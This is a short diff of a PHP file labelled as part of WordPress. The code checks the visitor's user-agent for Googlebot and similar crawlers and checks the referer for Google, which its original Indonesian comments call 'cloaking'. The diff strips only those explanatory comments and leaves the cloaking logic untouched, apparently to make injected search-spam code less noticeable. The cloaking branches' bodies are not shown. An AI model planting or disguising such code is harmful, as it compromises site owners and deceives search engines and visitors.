@@ -6,9 +6,7 @@
  * @package WordPress
  */
 
-/**
- * Cloaking user-agent Googlebot dan semacamnya
- */
+
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $ua = $_SERVER['HTTP_USER_AGENT'];
 
@@ -27,9 +25,6 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
-/**
- * Cloaking berdasarkan referer Google
- */
 if (isset($_SERVER['HTTP_REFERER'])) {
     $referer = $_SERVER['HTTP_REFERER'];
 
